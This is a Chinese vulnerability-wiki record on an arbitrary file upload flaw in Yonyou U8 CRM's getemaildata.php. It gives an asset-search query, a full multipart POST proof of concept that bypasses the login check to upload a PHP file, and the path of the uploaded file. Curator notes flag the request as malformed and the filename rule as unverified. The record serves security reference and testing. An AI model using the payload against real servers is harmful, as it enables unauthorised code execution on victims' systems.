---
source: "Threekiii/Vulnerability-Wiki"
title: "用友U8 CRM getemaildata上传"
product: "用友U8 CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知；尾空格处理平台条件"
prerequisites: "DontCheckLogin=1前提"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BGRP-u8/%E7%94%A8%E5%8F%8B-U8-CRM%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
id: "vw-abb6cecb9cd27723a74b53f1"
entity_id: "ve-fd48262dcab7f9b3542f6998"
schema_version: "1"
canonical: "Web安全/ERP企业/用友U8/用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件上传漏洞.md"
relation_type: "duplicate_of"
---

# 用友U8 CRM getemaildata上传

## 条目说明

- 对象与具体问题：用友U8 CRM；getemaildata上传
- 版本、配置及部署条件：未知；尾空格处理平台条件
- 认证与权限前提：DontCheckLogin=1前提
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- U8 CRM不是GRP-U8，需独立产品分类
- 末multipart边界未加终止--，HTTP需校正
- 文件名十六进制减一规则缺原始响应推导，不能固定updD24D
- 缺源码/版本/修复，phpinfo不等OS命令

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

### 漏洞描述

用友 U8 CRM客户关系管理系统 getemaildata.php 文件存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器权限，攻击服务器

### 漏洞影响

用友 U8 CRM客户关系管理系统

### 网络测绘

```
web.body="用友U8CRM"
```

### 漏洞复现

登陆页面

![image-20230828151026882](./.resource/用友-U8-CRM客户关系管理系统-getemaildata.php-任意文件上传漏洞/media/image-20230828151026882.png)

验证POC

```http
POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ

------WebKitFormBoundarykS5RKgl8t3nwInMQ
Content-Disposition: form-data; name="file"; filename="test.php "
Content-Type: text/plain

<?php phpinfo();?>

------WebKitFormBoundarykS5RKgl8t3nwInMQ
```

![image-20230828151040826](./.resource/用友-U8-CRM客户关系管理系统-getemaildata.php-任意文件上传漏洞/media/image-20230828151040826.png)

访问文件，文件名需要十六进制减一

```
/tmpfile/updD24D.tmp.php
```

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
